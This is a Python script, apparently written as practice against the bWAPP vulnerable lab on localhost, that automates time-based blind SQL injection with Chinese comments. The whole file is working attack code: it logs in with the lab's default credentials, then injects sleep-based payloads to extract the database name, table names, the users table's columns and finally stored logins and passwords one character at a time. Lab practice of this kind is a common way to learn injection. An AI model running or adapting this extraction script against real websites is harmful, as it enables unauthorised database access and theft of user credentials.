import requests
import time
import loginUtil

SQL_BASE_URL = "http://localhost:9999/sqli_15.php?title=Iron Man' and "

LOGIN_URL = "http://localhost:9999/login.php"

body = {"login": "bee", "password": "bug", "security_leve": 0, "form": "submit"}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive"
}

ACTION = " and sleep(2) -- &action=search"


def get_data_base_name_length(cookie) -> int:
    count = 0
    for i in range(100):
        url = SQL_BASE_URL + "length(database()) = {}".format(i) + ACTION
        start_time = time.time()
        requests.get(url, headers=headers, cookies=cookie)
        if time.time() - start_time > 1:
            print("数据库长度为{}".format(i))
            count = i
    return count


def get_date_base_name(cookie, count):
    temp = ""
    for i in range(count + 1):
        for j in range(33, 127):
            url = SQL_BASE_URL + "ascii(substr(database(),{},1)) = {}".format(i, j) + ACTION
            start_time = time.time()
            requests.get(url, headers=headers, cookies=cookie)
            if time.time() - start_time > 1:
                temp += chr(j)
    print("数据库名称为：{}".format(temp))


def get_table_count(cookie) -> int:
    count = 0
    for i in range(100):
        url = SQL_BASE_URL + "(select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database())={}".format(
            i) + ACTION
        start_time = time.time()
        requests.get(url, headers=headers, cookies=cookie)
        if time.time() - start_time > 1:
            print("一共有{}张表".format(i))
            count = i
    return count


def get_table_name_length_each_table(cookie, tableIndex):
    # 遍历每个表的名字 设置最长20个字符
    for tIndex in range(tableIndex):
        for tableLength in range(20):
            url = SQL_BASE_URL + "(select length(table_name) from information_schema.tables where table_schema = database() limit {},1)={}".format(
                tIndex, tableLength) + ACTION
            start_time = time.time()
            requests.get(url, headers=headers, cookies=cookie)
            if time.time() - start_time > 1:
                print("*" * 10)
                print("表字段长度为:", tableLength)
                get_table_name_each_table(cookie, tIndex, tableLength)
                print("*" * 10)


def get_table_name_each_table(cookie, tIndex, tableLength):
    # 获取每个表名字
    table_name = []
    for i in range(tableLength + 1):
        for j in range(33, 127):
            # select table_name from information_schema.tables where table_schema = database();
            url = SQL_BASE_URL + "(select  ascii(substr(table_name,{},1)) from information_schema.tables where table_schema = database() limit {},1)={}".format(
                i, tIndex, j) + ACTION
            start_time = time.time()
            requests.get(url, headers=headers, cookies=cookie)
            if time.time() - start_time > 1:
                table_name.append(chr(j))
    print(''.join(table_name))


def get_column_count(cookie) -> int:
    count = 0
    for i in range(100):
        url = SQL_BASE_URL + "(select count(column_name) from information_schema.columns where table_name = 'users') = {} ".format(
            i) + ACTION
        start_time = time.time()
        requests.get(url, headers=headers, cookies=cookie)
        if time.time() - start_time > 1:
            print("一共个{}字段".format(i))
            count = i
    return count


def get_user_table_column_length(cookie, columnCount):
    # 遍历每个表的名字 设置最长20个字符
    for cIndex in range(columnCount):
        for tableLength in range(20):
            url = SQL_BASE_URL + "(select length(column_name) from information_schema.columns where table_name = 'users' limit {},1)={}".format(
                cIndex, tableLength) + ACTION
            start_time = time.time()
            requests.get(url, headers=headers, cookies=cookie)
            if time.time() - start_time > 1:
                print("*" * 10)
                print("表字段长度为:", tableLength)
                get_table_column_name_each(cookie, cIndex, tableLength)
                print("*" * 10)


def get_table_column_name_each(cookie, cIndex, cLength):
    # 获取每个表名字
    table_name = []
    for i in range(cLength + 1):
        for j in range(33, 127):
            # select table_name from information_schema.tables where table_schema = database();
            url = SQL_BASE_URL + "(select  ascii(substr(column_name,{},1)) from information_schema.columns where table_name = 'users' limit {},1)={}".format(
                i, cIndex, j) + ACTION
            start_time = time.time()
            requests.get(url, headers=headers, cookies=cookie)
            if time.time() - start_time > 1:
                table_name.append(chr(j))
    print(''.join(table_name))


def get_use_name_password(cookie):
    userNameAndPassword = []
    for i in range(100):
        for j in range(33, 127):
            # select table_name from information_schema.tables where table_schema = database();
            url = SQL_BASE_URL + "(select ascii(substr(concat(login,'@',password),{},1)) from users limit 0,1)={}".format(
                i, j) + ACTION
            start_time = time.time()
            requests.get(url, headers=headers, cookies=cookie)
            if time.time() - start_time > 1:
                userNameAndPassword.append(chr(j))
    print(''.join(userNameAndPassword))


if __name__ == '__main__':
    # get_table_count()
    # 模拟login 获取响应 cookies
    startTime = time.time()
    cookies = loginUtil.login(LOGIN_URL, body, headers)
    # 通过cookies做后续测试
    # 获取database name
    get_date_base_name(cookies, get_data_base_name_length(cookies))
    # 获取各表名
    get_table_name_length_each_table(cookies, get_table_count(cookies))
    # 获取users 表字段
    get_user_table_column_length(cookies, get_column_count(cookies));
    # 获取用户名和密码
    get_use_name_password(cookies)
    print("破解耗时:", time.time() - startTime, "秒")
